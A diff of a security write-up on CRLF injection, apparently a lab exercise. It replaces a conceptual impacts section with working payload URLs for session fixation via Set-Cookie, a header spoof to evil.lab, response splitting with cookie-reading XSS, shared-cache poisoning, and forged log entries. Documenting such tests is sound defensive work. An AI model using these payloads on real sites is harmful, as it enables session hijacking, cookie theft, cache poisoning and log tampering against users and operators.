@@ -53,17 +53,30 @@ Location: /home
 X-Injected-Test: crlf-ok        <-- the injected header appears: CRLF injection confirmed
 ```
 
-### Phase 2 - Impacts (conceptual)
+### Phase 2 - Impacts (payloads)
 
-- **Header injection**: adding `Set-Cookie` (session fixation) or manipulated security headers.
-- **HTTP response splitting**: injecting a double CRLF sequence to close the headers and introduce a controlled
-  response body (from which a reflected XSS).
-- **Cache poisoning**: if the poisoned response is cached, the malicious content is served to other users.
-- **Log injection**: CRLF in a logged value allows inserting false log entries or breaking the log parsing
-  (anti-forensics).
+Value injected into a parameter reflected in a header (e.g., the target of a redirect). `%0d%0a` = CRLF:
 
-The complete operational forms are not reproduced: the principle is always the injection of `%0d%0a` to break out
-of the intended context (a header, a log line).
+```
+# Header injection: set a session cookie chosen by the attacker (session fixation)
+/redirect?url=%0d%0aSet-Cookie:%20SESSIONID=attacker_fixed_value
+
+# Open redirect / header spoofing
+/redirect?url=%0d%0aLocation:%20https://evil.lab
+
+# HTTP response splitting: a double CRLF closes the headers and injects a controlled body -> reflected XSS
+/redirect?url=%0d%0a%0d%0a<script>alert(document.cookie)</script>
+
+# Full variant (status + headers + body) to poison a shared cache
+/x?p=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>
+
+# Log injection: inject a fake log line / break parsing (anti-forensics)
+/login?user=admin%0d%0a2026-01-01%2000:00:00%20INFO%20successful%20login%20for%20admin
+```
+
+If the poisoned response ends up in a shared **cache**, the malicious content is served to other users (cache
+poisoning). The principle is always the injection of `%0d%0a` to break out of the intended context (a header, a
+log line) and inject controlled structure.
 
 ## Analysis of results
 
